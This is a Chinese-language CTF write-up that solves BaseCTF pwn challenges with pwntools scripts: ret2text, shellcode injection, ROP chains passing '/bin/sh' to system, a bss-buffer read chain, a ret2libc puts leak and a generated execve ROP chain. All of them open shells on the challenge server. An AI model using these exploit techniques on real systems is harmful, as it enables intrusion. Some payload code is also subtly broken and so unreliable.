---
title: BaseCTF PWN WP
date: '2024-12-09 21:15:44'
updated: '2025-04-07 21:33:51'
---
从头到尾又复现了一遍，也算是复习了一遍吧...

## 1、签个到吧
> 先用`nc`指令连接靶机：
>

```plain
nc challenge.basectf.fun 端口
```

> 接着用`ls`指令查看靶机程序当前目录下的文件：  
![](/images/cbb1ef3957f5ef3d6ff716279bb14338.png)  
可以看到靶机程序当前目录下就有flag文件
>

> 接下来就利用`cat flag`指令查看flag文件：
>
> ![](/images/59cee64f9005ef4b0ab8ecc3324ebcac.png)  
成功获得flag！
>

## 2、echo
> 也是先用`nc`指令连接靶机：
>

```plain
nc challenge.basectf.fun 端口
```

> 题目中提到了`echo`指令  
初查资料可以得知echo指令可以输出文字
>

> 输入指令`echo flag`
>
> ![](/images/2ea90578fe260fd3d8f3b1ac051babf1.png)  
发现这个指令只是将键盘输入的“flag”这个字符串打印出来了
>

> 接下来接着查资料如何利用`echo`指令输出文件内容
>
> 可以利用下面的指令将flag这一文件的内容打印出来：
>

```plain
echo "$(<flag)"
```

### 资料：重定向符、标准输入和命令替换
+ "<"是重定向符，用来改变标准输入stdin的源
+ `<flag`这一部分将flag文件内容作为标准输入的源
+ `$()`用于命令替换（其实就是将括号内的命令行结果作为值输入到括号外的命令来执行）

> 输入指令`echo "$(<flag)"`  
成功获得flag！
>

## 3、ret2text
> 下载题目附件Ret2text
>

+ ELF是一种用于存储可执行文件、目标代码、共享库和核心转储的文件格式
+ 广泛用于类Unix系统

> 按照国际惯例（）先用checksec看一下靶机程序的保护机制
>

```plain
checksec Ret2text
```

![](/images/030168f166f30a998ee9a18ce9bea7a7.png)

### 资料：checksec
+ Arch：程序架构
+ RELRO（Relocation Read-Only）：与GOT表改写的攻击方式相关
+ Stack：Canary是堆栈溢出哨兵，与栈溢出漏洞相关
+ NX：堆栈禁止执行，启用可以将某些内存区域标记为不可执行
+ PIE：位置无关可执行文件，代码段、数据段地址随机化（ASLR）
+ 剩下三个没找到资料额...

> 从上面的截图可以知道靶机程序是64位的，而且可以栈溢出
>

> 接下来用IDA逆向分析
>

> 先在界面左侧函数列表中找到`main`函数，按F5键查看原代码：
>
> ![](/images/c926982797631956f086a90585a26d80.png)
>

> 发现`main`函数里面用了`read`危险函数，  
而且`read`函数要读取的字节长达0x100=256字节  
所以可以通过`read`函数利用栈溢出漏洞来getshell
>

> 再在界面左侧的函数列表中找到`dt_gift`函数：
>
> ![](/images/922bf63691fcc2154fdd4984204a5c2b.png)
>

> 发现`dt_gift`函数中含有`system("/bin/sh")`指令可以getshell
>

> 再接下来回到汇编指令界面，可以看到`dt_gift`函数的地址是0x4011A4  
"starts at 4011A4"
>
> ![](/images/40f54ad7d9ac7cd2690b7c138aca7faf.png)
>

> 双击`main`函数原代码中`read`函数的参数buf可以看到`main`函数的栈帧：
>
> ![](/images/9ac487a678b70088d1442bc0b4489c2b.png)
>

> 从截图左边的相对位置可以算出来buf距离返回地址“__return_addsress”  
一共0x20+0x08=0x28字节
>

> 所以payload当中需要先填入0x28字节的垃圾数据  
再加上返回到`dt_gift`函数的地址来替换原来的返回地址  
这样程序在执行完`read`函数后就会返回到`dt_gift`函数继续运行
>

> 最后的最后，就是写脚本来实现这一系列过程了  
先在当前目录新建一个Python文件：
>

```plain
vim ret2text.py
```

> 接着开始敲代码：
>

```python
from pwn import *
link=remote('challenge.basectf.fun',端口)
dt_gift_addr=0x4011A4
payload=b'a'*0x28+p64(dt_gift_addr)
link.sendline(payload)
link.interactive()
```

> 打开实例接着运行脚本：
>

```plain
python3 ret2text.py
```

> 然后就发现Got EOF了...  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240824130423312.png)![](/images/bdb6dbfb9b929d8cf875dbb58708bb77.png)
>

> 接下来接着找资料：  
靶机程序是64位符合现代 x86-64 ABI（应用二进制接口）规范
>

### 重点：堆栈平衡
+ 现代 x86-64 ABI（应用二进制接口）规范要求栈在函数调用前对齐到 16 字节
+ 即rsp（栈顶寄存器）地址应为0x10的倍数

>  脚本中有操作空间的地方就是payload里面的返回地址 从返回地址入手，再看回 dt_gift 函数的汇编指令  
>
> ![](/images/746a56c46a6e312785f8371e7bb5637c.png)
>

> 可以看到在`call _system`指令之前有一个`push rbp`的指令  
这个指令会使rsp的地址减8，这也是调用`system`函数时Got EOF的原因
>

> 所以将调用`dt_gift`函数的地址改为在`push rbp`指令之后，在`lea rax,command`指令之前的地址  
就能够解决Got EOF的问题
>

> 最终的脚本如下：
>

```python
from pwn import *
link=remote('challenge.basectf.fun',端口)
dt_gift_addr=0x4011A9 #这里的地址从0x4011A4换成了0x4011A9
payload=b'a'*0x28+p64(dt_gift_addr)
link.sendline(payload)
link.interactive()
```

> 运行脚本输入命令行指令：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240824144029333.png)![](/images/25c9c7cff6047501f8cdfcb2d5e2786c.png)  
成功获得flag！
>

## 4、shellcode_level0
> 下载题目附件，先用checksec查一下  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240824201737838.png)![](/images/c1509d39be59b9d5b5ef963143670765.png)  
从截图可以知道程序是64位的  
还看到了栈溢出漏洞，但是和题目提示没关系...
>

> 接着用IDA逆向分析  
看到`main`函数里面有一个很特别的语句：
>
> ![](/images/cbb707ae07463d8cb693fc4f825074b2.png)
>

```plain
((void(*)(void))buf)()
```

> 非常好括号，使我晕头转向（？）
>

### 资料：函数指针
+ `void(*)(void)`是一个函数指针类型，表示指向没有参数且没有返回值的函数
+ 而`buf`是一个`void *`类型的指针，用于表示内存地址
+ `(void(*)(void))buf`将`buf`转换为`void(*)(void)`类型的指针

> 此时`(void(*)(void))buf`将内存中的`buf`视作一个函数  
`((void(*)(void))buf)()`则将这一函数调用
>

总而言之，程序将`read`函数读取的数据存储到`buf`当中，  
指令`((void(*)(void))buf)()`将`buf`当中的数据作为函数调用了

> `pwntools`库可以直接生成shellcode  
可以用`pwntools`生成shellcode送进内存里面被执行从而getshell
>

> 开始敲代码：
>

```python
from pwn import *
link=remote('challenge.basectf.fun',端口)
context(log_level='debug',arch='amd64',os='linux')
shellcode=asm(shellcraft.sh())
link.sendline(shellcode)
link.interactive()
```

> ![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240824212645520.png)![](/images/9032cde0f0b721d1ce83d5a60d2b5cfa.png)  
成功getshell，输入命令成功获得flag！
>

## 5、我把她丢了
> 首先还是checksec：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240824214637753.png)![](/images/b96a859458dc163a339a72ca5c38e982.png)  
从截图可以得出信息：64位程序、可以栈溢出、没有位置无关可执行文件`PIE`
>

> 接着进行信息采集工作（？）  
用IDA分析一下靶机的程序：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240824220109215.png)![](/images/017b7bc686e482b1ed5bb03a3459c353.png)  
先从`main`函数入手，可以看到`main`函数当中只有一个可疑的`vuln`函数
>

> 接着再在左边的函数列表里面找到这个可疑的`vuln`函数，查看源代码：
>
> ![](/images/cbf4167c3208f5d62d644aea6e543a98.png)  
发现`vuln`函数中有`read`危险函数，可以利用栈溢出漏洞修改返回地址
>

> 接着又发现左边函数列表里面有个`shell`函数里面调用了`system`函数：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240824222819369.png)![](/images/f1ad6c9936408057e1925f812ca89d8f.png)
>

但是程序并没有后门函数可以直接执行`system("/bin/sh")`指令从而getshell  
所以接下来就去IDA的Strings里面寻找线索：

> ![](/images/18865b98e6199bfa589b1e08f2cbfd7e.png)
>
> 发现Strings当中有getshell需要的"/bin/sh"字符
>

> 已经知道靶机程序是64位的，  
可以利用64位程序函数调用时传参的机制来修改调用`system`函数时的参数，  
将`/bin/sh`传入从而执行`system("/bin/sh")`指令
>

### 重点：64位程序函数传参机制
+ 64位程序当中函数被调用时前6个参数会依次通过rdi、rsi、rdx、rcx、r8、r9 六个寄存器传入，多于6个之外的参数通过栈传入
+ 32位程序当中函数被调用时所有参数都是通过栈传入

> 因此可以利用64位程序函数传参的机制来将`/bin/sh`传入`system`函数从而实现执行`system("/bin/sh")`指令
>

> 回到IDA，从刚才Strings截图当中可以知道`/bin/sh`的地址是0x402008  
再看回`shell`函数的汇编指令：
>
> ![](/images/cc98401f43b7877f6c280985e236013c.png)  
从图上可以知道`call system`指令的地址是0x40120F
>

> 接着看看`vuln`函数的栈帧：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825001527876.png)![](/images/563a3a67344c85c4e15566b1442502ec.png)  
可以知道`buf`离返回地址有0x70+0x08=0x78个字节
>

> 贴一张手写的分析，感觉原理逻辑用文字不太能表达的出来（其实是偷懒）：
>
> ![](/images/bb43b55cf9e0266e131a8e32630e5632.jpeg)
>

> 因为`system("/bin/sh")`指令只传入了一个参数`"/bin/sh"`，  
根据64位程序函数传参机制，需要用到rdi寄存器来传入`/bin/sh`  
所以在汇编指令界面找到`pop rdi;ret`指令：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825002253439.png)![](/images/cfd7fcd353fe8e851fa4187f0350fbf4.png)  
得到`pop rdi;ret`指令的地址为0x401196
>

> 接下来就是写脚本啦：
>

```plain
from pwn import *
link=remote('challenge.basectf.fun',端口)
binsh_addr=0x402008
system_addr=0x40120F
rdi=0x401196
payload=b'a'*0x78+p64(rdi)+p64(binsh_addr)+p64(system_addr)
link.sendline(payload)
link.interactive()
```

> 运行脚本  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825002904606.png)![](/images/ba5240c2f22e9c08e18d6b58e3d7c76e.png)
>
> 输入命令行指令后成功获得flag！
>

## 6、彻底失去她
> 下载题目附件，首先还是用checksec查一下：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825110403124.png)![](/images/8dca7433c4e9ff4c7e4467694a30c750.png)  
可以知道程序是64位的，可以栈溢出，没有位置无关可执行文件`PIE`
>

> 接着用IDA分析：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825113410995.png)![](/images/3e4e7b447459d72195dd981ec11a239e.png)  
先从`main`函数原代码入手，有`read`危险函数可以用于栈溢出修改程序流程
>

> 再来看看`main`函数的栈帧来计算需要填充多少垃圾数据才到返回地址：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825141432462.png)![](/images/d27249319ecc05632d36832a54b38cff.png)  
算出来结果是0x0A+0x08=0x12个字节
>

> 再在左侧函数列表找找有没有可以利用的函数：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825120835279.png)![](/images/6eb74bd47d2db026e5aece8d71360508.png)  
发现`present`函数当中调用了`system`函数，但是却不是`system('/bin/sh')`
>

> 接着到IDA的Strings界面找找线索：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825121432691.png)![](/images/f3191c6b86627439b6c1cb7dba7d8daf.png)  
并没有找到需要的`/bin/sh`字符串
>

> 到程序的汇编指令界面看看：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825123238236.png)![](/images/4e042d6c400c0f87986889221e066653.png)  
发现`bss`段中有一个`buffer`变量，地址是0x4040A0
>

### 资料：`bss`段
+ `bss`段是用来存放未初始化的全局变量的一块内存区域

> 可以用`bss`段里面的`buffer`变量来存点东西  
所以可以利用`read`函数往`buffer`里面存进`/bin/sh`字符串  
再利用64位传参把`/bin/sh`字符串传给`system`函数
>

> 理论存在，实践开始（？）
>

> 开始写脚本：
>

```python
from pwn import *
link=remote('challenge.basectf.fun',端口)
e=ELF('./chedishiquta')

system_addr=0x4011A5
rdi=0x401196
rsi=0x4011AD
rdx=0x401265
buffer_addr=0x4040A0
read_addr=e.sym['read'] #在ELF文件"chedishiquta"中找到read的地址

link.recvuntil(b'name?') #等待直到接收到"name?"后继续执行
payload=b'a'*0x12
+p64(rdi)+p64(0) #read函数的第一个参数 fd：文件描述符（0标准输入 1标准输出 2标准错误）
+p64(rsi)+p64(buffer_addr) #第二个参数 buf：指向内存缓冲区的指针 read函数读取的数据存储的位置
+p64(rdx)+p64(0x100) #第三个参数 count：要读取的字节数
+p64(read_addr)+p64(rdi)+p64(buffer_addr)+p64(system_addr)

link.sendline(payload)
link.sendline(b'/bin/sh\x00') #记得加上终止符"\x00"以防buffer中原有值影响system函数执行
link.interactive()
```

### 资料：终止符
+ 在C语言中字符串以`\x00`作为结束标志，称为null终止符，可以避免程序访问越界内存

> 运行脚本发现成功Get EOF，应该是栈平衡的问题
>

### 重点：堆栈平衡的常用方法
> 回到程序的汇编指令界面：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825143753058.png)![](/images/df1ee200e0397d410024f6d8a1a77df0.png)  
在里面找个`retn`指令把地址记下来，这个地址是0x401266
>

+ 汇编指令`retn`就等于`pop rip`
+ 可以将`rsp`的地址加8从而补齐16位

> 所以在上面写的payload里面，在调用`system`函数之前塞上`retn`指令的地址就可以解决了
>
> payload那块应该改成下面这样：
>

```python
retn=0x401266

payload=b'a'*0x12
+p64(rdi)+p64(0) #read函数的第一个参数 fd：文件描述符（0标准输入 1标准输出 2标准错误）
+p64(rsi)+p64(buffer_addr) #第二个参数 buf：指向内存缓冲区的指针 read函数读取的数据存储的位置
+p64(rdx)+p64(0x100) #第三个参数 count：要读取的字节数
+p64(read_addr)
+p64(retn) #在这里加上retn指令的地址
+p64(rdi)+p64(buffer_addr)+p64(system_addr)
```

> 最后运行脚本，打入命令行指令成功获得flag！（截屏的时候虚拟机正好死机了...）  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240825144731064.png)![](/images/5656a0da65bf56bd6d2a2964368569df.png)
>

## 7、她与你皆失（ret2libc)
> 下载题目附件，解压发现有两个文件：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240826095306870.png)![](/images/7792efbf96e832a4522035963046529f.png)  
用checksec查一下pwn文件的保护机制：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240826095420520.png)![](/images/c781d01d692b2c30759c10c98c1e0266.png)  
可以知道程序是64位的，可以栈溢出，没有位置无关可执行文件`PIE`
>

> 接下来到IDA里面看看：  
先从`main`函数原代码入手  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240826104909154.png)![](/images/9d1226afb75c65bc9b1456f9fe224521.png)  
可以看到里面用了`puts`函数和`read`函数
>

> 接着搜遍了左边的函数列表和Strings界面  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240826105939742.png)![](/images/cc0f7001f891b29ec3eee56c14789c65.png)  
都没有发现可以利用的`system`函数和`/bin/sh`字符串
>

> 这个时候就得用其他的方法得到`system`函数和`/bin/sh`字符串了  
而题目附件里面还给了`libc.so.6`文件
>

### 重点：`libc`
+ 存在于`Linux`系统当中的C语言标准库，具体叫GNU C Library（glibc）
+ 用来为程序提供基本功能的库，存储了一些比较基本的函数和字符串（比如`system`函数和`/bin/sh`字符串）

### 资料：GOT和PLT 与 延迟绑定
+ GOT （Global Offset Table，全局偏移表）：是一个用于存储`libc`库函数地址的表
+ PLT（Procedure Linkage Table，过程链接表）：是用于延迟绑定的表，与GOT表一一对应也就是说，GOT表中存的是函数的实际地址，而PLT表中存的是GOT表的地址
+ 延迟绑定：第一次调用函数时才解析函数的地址存在GOT表中，后续不再通过PLT表调用动态链接器解析函数的地址

> 这里再贴一张自己理解时的手写分析（画得有点丑...）：  
![](/images/42dd055cb410dc693b1787f5005b1d60.jpeg)  
分析之后发现可以利用`puts`函数将其实际地址暴露  
然后利用`puts`函数相对`libc`基地址的偏移固定，得出`libc`库的基地址  
最后反推得出`system`函数和`/bin/sh`字符串的实际地址
>

> 开始写脚本：
>

```python
from pwn import *
link=remote('challenge.basecctf.fun',端口)
e=ELF('./pwn')
libc=ELF('./libc.so.6')

main_addr=0x4011DF
rdi=0x401176
retn=0x401179 #看看后来调用system函数时栈是否平衡，不平衡就把retn加上
puts_plt=e.plt['puts']
puts_got=e.got['puts']

link.recvuntil(b'do?')
payload1=b'a'*0x12
payload1+=p64(rdi)
payload1+=p64(puts_got) #先将puts的实际地址放到rdi寄存器中
payload1+=p64(puts_plt) #再调用puts将实际地址输出
payload1+=p64(main_addr) #由于程序main函数只有一次read，所以还得再次回到main函数再用read函数修改返回地址来实现system('/bin/sh')
link.sendline(payload1)
puts_real_addr=u64(link.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
```

> 写到这里就已经成功把`puts`函数的实际地址给得到了
>
> 重点是最后这句：
>

```python
puts_real_addr=u64(link.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
```

+ `u64()`是解包
+ `[-6:]`这个是指取接收到的数据的最后6个字节
+ `ljust()`函数是在原数据末尾添加指定数据补齐一定长度（这里是末尾加`\x00`补齐8字节）

> 在处理之前会得到这样的结果：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240826121201886.png)![](/images/5d7e52ab585a60942229881929131e46.png)  
在处理后是这样的结果：  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240826121252121.png)![](/images/bb28cade068304bc4ac406d8023f2acd.png)
>

> 然后接着计算`system`函数和`/bin/sh`字符串的地址：
>

```python
libc_base=puts_real_addr-libc.sym['puts']
system_addr=libc_base+libc.sym['system']
binsh_addr=libc_base+next(libc.search(b'/bin/sh')) #/bin/sh是字符串得用search函数找，而且search函数返回结果是列表，要用next函数获取第一项
```

> 最后写出完整的脚本：
>

```python
from pwn import *
link=remote('challenge.basecctf.fun',端口)
e=ELF('./pwn')
libc=ELF('./libc.so.6')

main_addr=0x4011DF
rdi=0x401176
retn=0x401179 #看看后来调用system函数时栈是否平衡，不平衡就把retn加上
puts_plt=e.plt['puts']
puts_got=e.got['puts']

link.recvuntil(b'do?')
payload1=b'a'*0x12
payload1+=p64(rdi)
payload1+=p64(puts_got) #先将puts的实际地址放到rdi寄存器中
payload1+=p64(puts_plt) #再调用puts将实际地址输出
payload1+=p64(main_addr) #由于程序main函数只有一次read，所以还得再次回到main函数再用read函数修改返回地址来实现system('/bin/sh')
link.sendline(payload1)
puts_real_addr=u64(link.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

libc_base=puts_real_addr-libc.sym['puts']
system_addr=libc_base+libc.sym['system']
binsh_addr=libc_base+next(libc.search(b'/bin/sh')) #/bin/sh是字符串得用search函数找，而且search函数返回结果是列表，要用next函数获取第一项

payload2=b'a'*0x12
payload2+=p64(retn) #在没加retn的情况下运行了一遍发现Got EOF，所以加上了
payload2+=p64(rdi)
payload2+=p64(binsh_addr)
payload2+=p64(system_addr)
link.sendline(payload2)

link.interactive()
```

> 运行脚本，输入命令行指令  
![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20240826123210521.png)![](/images/eb19636e9cf68517bc90a8f58f64d108.png)  
成功获得flag！
>

## 8、format_string_level0
后面的没写了...

## 补充
### gift
exp：（忘了是用什么自动生成 payload 的了...）

```python
from pwn import *
from struct import pack
io=remote('challenge.basectf.fun',23326)
p = b''

p += pack('<Q', 0x0000000000409f9e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000419484) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000409f9e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000043d350) # xor rax, rax ; ret
p += pack('<Q', 0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401f2f) # pop rdi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000409f9e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000047f2eb) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x000000000043d350) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401ce4) # syscall
payload=b'a'*(0x20+8)+p
io.recv()
io.sendline(payload)
io.interactive()
```

